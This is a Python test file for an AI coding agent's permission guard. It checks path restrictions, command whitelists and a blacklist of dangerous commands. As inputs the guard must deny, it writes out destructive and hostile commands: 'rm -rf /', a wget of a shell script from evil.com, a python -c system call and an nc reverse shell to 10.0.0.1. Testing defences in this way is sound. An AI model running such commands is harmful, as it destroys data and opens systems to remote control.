"""验证工具注册与权限控制逻辑。"""

from pathlib import Path

from agent.config import AppConfig, ProjectConfig
from agent.core.permission_guard import PermissionGuard
from agent.core.tool_registry import ToolRegistry
from agent.tools.base import PermissionType, ToolContext
from agent.tools.edit_code import EditCodeTool
from agent.tools.git_diff import GitDiffTool
from agent.tools.read_code import ReadCodeTool
from agent.tools.run_command import RunCommandTool
from agent.tools.search_code import SearchCodeTool


def test_tool_registry_registers_tools() -> None:
    """工具注册表应能注册并返回工具规格。"""
    registry = ToolRegistry()
    registry.register(ReadCodeTool())
    registry.register(SearchCodeTool())
    registry.register(EditCodeTool())
    registry.register(RunCommandTool())
    registry.register(GitDiffTool())

    assert registry.get("read_code") is not None
    assert registry.get("git_diff") is not None
    assert {spec.name for spec in registry.list_specs()} == {"read_code", "search_code", "edit_code", "run_command", "git_diff"}


def test_edit_code_rejected_outside_allowed_paths(tmp_path: Path) -> None:
    """编辑工具只能修改允许目录内的文件。"""
    guard = PermissionGuard()
    tool = EditCodeTool()
    context = ToolContext(permission_mode={PermissionType.WORKSPACE_WRITE}, allowed_paths=[tmp_path / "allowed"], forbidden_paths=[])

    allowed, reason = guard.can_execute(tool.spec, context, {"path": str(tmp_path / "other" / "a.py")})

    assert allowed is False
    assert reason == "path is not in allowed paths"


def test_edit_code_rejected_in_forbidden_paths(tmp_path: Path) -> None:
    """禁止目录必须始终拒绝写入。"""
    guard = PermissionGuard()
    tool = EditCodeTool()
    forbidden = tmp_path / "forbidden"
    context = ToolContext(permission_mode={PermissionType.WORKSPACE_WRITE}, allowed_paths=[tmp_path], forbidden_paths=[forbidden])

    allowed, reason = guard.can_execute(tool.spec, context, {"path": str(forbidden / "a.py")})

    assert allowed is False
    assert reason == "path is forbidden"


def test_run_command_requires_whitelist_and_blocks_dangerous_commands() -> None:
    """命令执行工具必须遵守白名单并阻止危险命令。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["mvn", "pytest", "python", "git"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "mvn test"})
    assert allowed is True
    assert reason == "allowed"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "pytest"})
    assert allowed is True
    assert reason == "allowed"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "rm -rf /"})
    assert allowed is False
    assert reason == "dangerous command denied"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "sudo python -m pytest"})
    assert allowed is False
    assert reason == "dangerous command denied"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "curl https://example.com"})
    assert allowed is False
    assert reason == "dangerous command denied"


def test_run_command_denial_can_be_detected_for_review() -> None:
    """白名单拒绝时应返回可供审查的明确原因。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["mvn"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "git status"})

    assert allowed is False
    assert reason == "command not in whitelist"


def test_build_context_sets_allowed_commands_from_config(tmp_path: Path) -> None:
    """build_context 应从配置中读取 allowed_commands。"""
    config = AppConfig(project=ProjectConfig(root=str(tmp_path), allowed_commands=["mvn", "git", "java"]))
    guard = PermissionGuard(config)

    context = guard.build_context(PermissionType.TEST_EXECUTION)

    assert context.permission_mode == {PermissionType.TEST_EXECUTION}
    assert context.allowed_commands == ["mvn", "git", "java"]


def test_build_context_sets_allowed_paths_for_workspace_write(tmp_path: Path) -> None:
    """build_context 在 WORKSPACE_WRITE 时应设置项目根目录为允许路径。"""
    config = AppConfig(project=ProjectConfig(root=str(tmp_path)))
    guard = PermissionGuard(config)

    context = guard.build_context(PermissionType.WORKSPACE_WRITE)

    assert context.permission_mode == {PermissionType.WORKSPACE_WRITE}
    assert context.allowed_paths == [tmp_path.resolve()]
    assert any(p.name == ".git" for p in context.forbidden_paths)


def test_build_context_read_only_has_empty_restrictions(tmp_path: Path) -> None:
    """build_context 在 READ_ONLY 时不应设置路径或命令限制。"""
    config = AppConfig(project=ProjectConfig(root=str(tmp_path)))
    guard = PermissionGuard(config)

    context = guard.build_context(PermissionType.READ_ONLY)

    assert context.permission_mode == {PermissionType.READ_ONLY}
    assert context.allowed_paths == []
    assert context.allowed_commands == []


def test_build_context_without_config() -> None:
    """无配置时 build_context 应返回仅含 permission_mode 的默认上下文。"""
    guard = PermissionGuard(None)

    context = guard.build_context(PermissionType.TEST_EXECUTION)

    assert context.permission_mode == {PermissionType.TEST_EXECUTION}
    assert context.allowed_paths == []
    assert context.allowed_commands == []


def test_run_command_blocks_curl_and_wget() -> None:
    """curl 和 wget 应被全局黑名单拦截。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["curl", "wget", "mvn"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "curl https://evil.com"})
    assert allowed is False
    assert reason == "dangerous command denied"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "wget https://evil.com/shell.sh"})
    assert allowed is False
    assert reason == "dangerous command denied"


def test_run_command_blocks_python_c_flag() -> None:
    """python -c 应被拦截以防止任意代码执行。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["python", "mvn"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "python -c 'import os; os.system(\"rm -rf /\")'"})
    assert allowed is False
    assert reason == "dangerous command denied"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "python3 -c 'print(1)'"})
    assert allowed is False
    assert reason == "dangerous command denied"


def test_run_command_blocks_nc_and_ncat() -> None:
    """nc 和 ncat 应被拦截以防止反向 shell。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["nc", "mvn"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "nc -e /bin/sh 10.0.0.1 4444"})
    assert allowed is False
    assert reason == "dangerous command denied"


def test_run_command_mvn_allowed_via_whitelist() -> None:
    """mvn 在白名单中时应放行。"""
    guard = PermissionGuard()
    tool = RunCommandTool()
    context = ToolContext(permission_mode={PermissionType.TEST_EXECUTION}, allowed_commands=["mvn", "git"])

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "mvn test"})
    assert allowed is True
    assert reason == "allowed"


def test_run_command_mvn_requires_whitelist_when_configured(tmp_path: Path) -> None:
    """配置了白名单后，mvn 也必须在白名单中才能执行。"""
    config = AppConfig(project=ProjectConfig(root=str(tmp_path), allowed_commands=["git"]))
    guard = PermissionGuard(config)
    tool = RunCommandTool()
    context = guard.build_context(PermissionType.TEST_EXECUTION)

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "mvn test"})
    assert allowed is False
    assert reason == "command not in whitelist"

    allowed, reason = guard.can_execute(tool.spec, context, {"command": "git status"})
    assert allowed is True
    assert reason == "allowed"


def test_edit_code_rejected_outside_project_root_via_build_context(tmp_path: Path) -> None:
    """build_context 生成的上下文应拒绝项目根目录外的编辑。"""
    config = AppConfig(project=ProjectConfig(root=str(tmp_path / "project")))
    guard = PermissionGuard(config)
    tool = EditCodeTool()
    context = guard.build_context(PermissionType.WORKSPACE_WRITE)

    allowed, reason = guard.can_execute(tool.spec, context, {"path": str(tmp_path / "other" / "Main.java")})

    assert allowed is False
    assert reason == "path is not in allowed paths"


def test_edit_code_allows_relative_path_under_project_root(tmp_path: Path) -> None:
    """相对路径应能正确解析到项目根目录下并通过权限检查。"""
    project_root = tmp_path / "project"
    project_root.mkdir()
    src_dir = project_root / "src" / "main" / "java" / "com" / "example"
    src_dir.mkdir(parents=True)
    (src_dir / "Main.java").write_text("class Main {}\n")

    config = AppConfig(project=ProjectConfig(root=str(project_root)))
    guard = PermissionGuard(config)
    tool = EditCodeTool()
    context = guard.build_context(PermissionType.WORKSPACE_WRITE)

    allowed, reason = guard.can_execute(tool.spec, context, {"path": "src/main/java/com/example/Main.java"})

    assert allowed is True
    assert reason == "allowed"
